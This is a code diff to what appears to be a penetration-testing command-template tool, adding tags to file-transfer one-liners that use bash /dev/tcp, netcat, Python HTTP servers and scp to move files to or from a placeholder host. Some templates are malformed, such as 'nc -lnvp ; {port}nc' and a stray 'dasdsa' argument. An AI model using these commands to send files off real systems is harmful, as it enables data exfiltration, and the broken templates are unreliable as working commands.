@@ -438,42 +438,42 @@ const Transfer = withCommandType(
         {
             "name": "Bash Upload",
             "command": "bash -c 'echo -e \"POST / HTTP/0.9 $(<{fileName})\" > /dev/tcp/{ip}/{port}\n\nbash -c 'cat {fileName} > /dev/tcp/{ip}/{port}''",
-            "meta": ["linux"]
+            "meta": ["linux", "upload"]
         },
         {
             "name": "Bash Download",
             "command": "nc -l -p {port} < {fileName}\n\nbash -c 'cat < /dev/tcp/{ip}/{port} > {fileName}'",
-            "meta": ["linux"]
+            "meta": ["linux", "download"]
         },
         {
             "name": "Netcat Upload",
             "command": "nc -lnvp ; {port}nc {ip} {port} < {fileName}",
-            "meta": ["linux"]
+            "meta": ["linux", "upload"]
         },
         {
             "name": "Netcat Download",
             "command": "nc {ip} {port} < {fileName}\n\nnc -lnvp {port} > {fileName}",
-            "meta": ["linux"]
+            "meta": ["linux", "download"]
         },
         {
             "name": "Python3 HTTP Server",
             "command": "python3 -m http.server {port}",
-            "meta": ["linux"]
+            "meta": ["linux", "upload"]
         },
         {
             "name": "Python2 HTTP Server",
             "command": "python -m SimpleHTTPServer {port}",
-            "meta": ["linux"]
+            "meta": ["linux", "upload"]
         },
         {
             "name": "SCP Upload from local host to remote computer",
-            "command": "scp dasdsa username@{ip}:~/destination -P {port}",
-            "meta": ["linux"]
+            "command": "scp dasdsa username@{ip}:~/{fileName} -P {port}",
+            "meta": ["linux", "upload"]
         },
         {
             "name": "SCP Download from remote computer",
-            "command": "scp user@{ip}:~/{filePath} {fileName} -P {port}",
-            "meta": ["linux"]
+            "command": "scp user@{ip}:~/{fileName} -P {port}",
+            "meta": ["linux", "windows", "download"]
         },
 
     ]
